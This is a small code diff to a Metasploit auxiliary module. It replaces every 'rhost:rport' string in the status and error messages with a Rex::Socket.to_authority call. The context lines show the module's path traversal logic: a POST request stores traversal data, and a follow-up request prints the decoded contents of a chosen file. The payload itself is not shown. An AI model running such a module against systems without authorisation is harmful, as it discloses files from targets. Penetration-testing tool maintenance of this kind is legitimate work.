@@ -40,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(_ip)
     tmpfile = Rex::Text.rand_text_alphanumeric(20) # Store the base64 encoded traversal data in a hard-to-brute filename, just in case.
 
-    print_status("Attempting to connect to #{rhost}:#{rport}")
+    print_status("Attempting to connect to #{Rex::Socket.to_authority(rhost, rport)}")
     res = send_request_raw(
       {
         'method' => 'POST',
@@ -49,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     if res && res.code == 500
-      print_good("Request appears successful on #{rhost}:#{rport}! Response: #{res.code}")
+      print_good("Request appears successful on #{Rex::Socket.to_authority(rhost, rport)}! Response: #{res.code}")
 
       file = send_request_raw(
         {
@@ -59,12 +59,12 @@ class MetasploitModule < Msf::Auxiliary
       )
 
       if file && (file.code == 200)
-        print_status("Request for #{datastore['FILE']} appears to have worked on #{rhost}:#{rport}! Response: #{file.code}\r\n#{Rex::Text.decode_base64(file.body)}")
+        print_status("Request for #{datastore['FILE']} appears to have worked on #{Rex::Socket.to_authority(rhost, rport)}! Response: #{file.code}\r\n#{Rex::Text.decode_base64(file.body)}")
       elsif file && file.code
-        print_error("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport} Response: \r\n#{res.body}")
+        print_error("Attempt returned HTTP error #{res.code} on #{Rex::Socket.to_authority(rhost, rport)} Response: \r\n#{res.body}")
       end
     elsif res && res.code
-      print_error("Attempt returned HTTP error #{res.code} on #{rhost}:#{rport} Response: \r\n#{res.body}")
+      print_error("Attempt returned HTTP error #{res.code} on #{Rex::Socket.to_authority(rhost, rport)} Response: \r\n#{res.body}")
     end
   rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
     vprint_error(e.message)
